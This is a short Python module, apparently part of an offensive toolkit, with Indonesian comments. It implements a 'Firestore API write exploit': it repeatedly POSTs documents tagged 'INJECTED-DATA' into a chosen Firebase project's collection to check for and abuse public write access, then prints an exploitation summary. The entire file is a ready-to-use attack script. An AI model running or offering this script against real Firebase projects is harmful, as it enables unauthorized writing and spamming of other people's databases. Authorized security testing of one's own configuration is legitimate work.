# script/firebase_fs.py
import requests
import json
import time

from app.utility.colors import C

REQUIRED_OPTIONS = {"ID": "", "PATH": "", "MESSAGE": "", "COUNT": ""}


def execute(options):
    """
    Melakukan serangan Injeksi Data POST langsung ke Firestore API
    untuk menguji Public Write Access pada koleksi tertentu.
    """
    print(f"{C.MENU}\n--- FIRESTORE API WRITE EXPLOIT ---")

    # Meminta input
    project_id = options.get("ID")

    collection_name = options.get("PATH")

    message = options.get("MESSAGE")

    try:
        count = options.get("COUNT")
    except ValueError:
        print(f"{C.ERROR} Harus berupa angka! Mengatur default ke 1.")
        count = 1

    # URL Firestore REST API
    base_url = "https://firestore.googleapis.com/v1/projects"
    url = f"{base_url}/{project_id}/databases/(default)/documents/{collection_name}"

    print(f"{C.MENU}\n[!] URL: {url}")
    print(f"{C.MENU}[!] Mengirim {count} Document...\n")

    success_count = 0
    fail_count = 0
    delay = 0.5
    current_time = int(time.time())

    for i in range(count):
        current_time = int(time.time())
        payload_data = {
            "fields": {
                "author": {"stringValue": "INJECTED-DATA"},
                "message": {"stringValue": f"{message} (#{i+1})"},
                "timestamp": {"integerValue": current_time},
                "status": {"stringValue": "SUCCESS"},
            }
        }

        try:
            response = requests.post(
                url,
                headers={"Content-Type": "application/json"},
                data=json.dumps(payload_data),
                timeout=10,
            )

            # Analisis Respon
            if response.status_code == 200:
                print(
                    f"{C.SUCCESS} [{i+1}/{count}] ✅ Success!	|	Status: {response.status_code}	|	ID: {response.json().get('name')}"
                )
                success_count += 1
            else:
                print(
                    f"{C.ERROR} [{i+1}/{count}] ❌ Access denied.	|	Status: {response.status_code}"
                )
                fail_count += 1

            if i < count - 1:
                time.sleep(delay)

        except requests.exceptions.RequestException as e:
            print(f"{C.ERROR}\n❌ ERROR KONEKSI pada pengiriman ke-{i+1}/{count}")
            fail_count += 1
            print(f"{C.ERROR}Detail: {e}")

    print(f"\n{C.MENU} --- RINGKASAN EKSPLOITASI ---")
    print(f"{C.SUCCESS} Total Berhasil: {success_count}")
    print(f"{C.ERROR} Total Gagal: {fail_count}")
